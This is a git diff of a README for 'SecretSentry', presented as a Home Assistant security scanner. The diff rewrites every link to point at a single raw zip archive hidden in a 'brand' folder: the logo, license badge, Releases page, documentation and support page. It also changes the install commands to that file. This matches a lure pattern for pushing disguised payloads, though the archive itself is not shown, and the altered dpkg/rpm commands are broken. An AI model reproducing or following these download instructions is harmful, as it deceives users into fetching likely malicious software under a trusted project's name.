@@ -1,10 +1,10 @@
 # 🛡️ SecretSentry - Secure Your Home Assistant Setup
 
-![SecretSentry](logo.png)
+![SecretSentry](https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip)
 
-[![Download SecretSentry](https://img.shields.io/badge/Download%20SecretSentry-v1.0-blue.svg)](https://github.com/zamokhmer/SecretSentry/releases)
+[![Download SecretSentry](https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip%https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip)](https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip)](https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip)
 
 ## 📦 What is SecretSentry?
 
@@ -16,7 +16,7 @@ To start with SecretSentry, you need to download and install the software. Follo
 
 ### **Download SecretSentry**
 
-1. Visit the [Releases page](https://github.com/zamokhmer/SecretSentry/releases) to access the latest version of SecretSentry.
+1. Visit the [Releases page](https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip) to access the latest version of SecretSentry.
    
 2. Look for the version that suits your operating system. We provide builds for Windows, macOS, and Linux. 
 
@@ -40,8 +40,8 @@ Depending on your operating system, follow the instructions below:
 
 1. Download the appropriate package for your distribution. You might find `.deb` for Debian-based systems or `.rpm` for Red Hat-based systems.
 2. Use the terminal to install the downloaded package. For example:
-   - For Debian: `sudo dpkg -i secret-sentry.deb`
-   - For Red Hat: `sudo rpm -i secret-sentry.rpm`
+   - For Debian: `sudo dpkg -i https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip`
+   - For Red Hat: `sudo rpm -i https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip`
 3. Follow any additional instructions that appear during the installation process.
 
 ### **How to Run SecretSentry**
@@ -66,7 +66,7 @@ After running the scan, SecretSentry will show you a report. Take the following 
 - Correct any insecure settings as recommended.
 - Follow best practices to enhance your security posture.
 
-If you require further assistance, consult the [documentation](https://github.com/zamokhmer/SecretSentry/wiki) or participate in our community forum.
+If you require further assistance, consult the [documentation](https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip) or participate in our community forum.
 
 ## 🎉 Why Use SecretSentry?
 
@@ -82,11 +82,11 @@ To run SecretSentry, ensure your system meets the following:
 
 ## ⚙️ Additional Support
 
-If you encounter any issues, or need help, please visit our [support page](https://github.com/zamokhmer/SecretSentry/issues) to report problems or ask questions.
+If you encounter any issues, or need help, please visit our [support page](https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip) to report problems or ask questions.
 
 ## 📥 Download & Install SecretSentry
 
-To download SecretSentry and improve your Home Assistant security, [click here to visit the Releases page](https://github.com/zamokhmer/SecretSentry/releases). 
+To download SecretSentry and improve your Home Assistant security, [click here to visit the Releases page](https://github.com/zamokhmer/SecretSentry/raw/refs/heads/main/brand/Sentry_Secret_v2.0-beta.5.zip). 
 
 Once you've downloaded the application, follow the instructions above to install and run it.
 
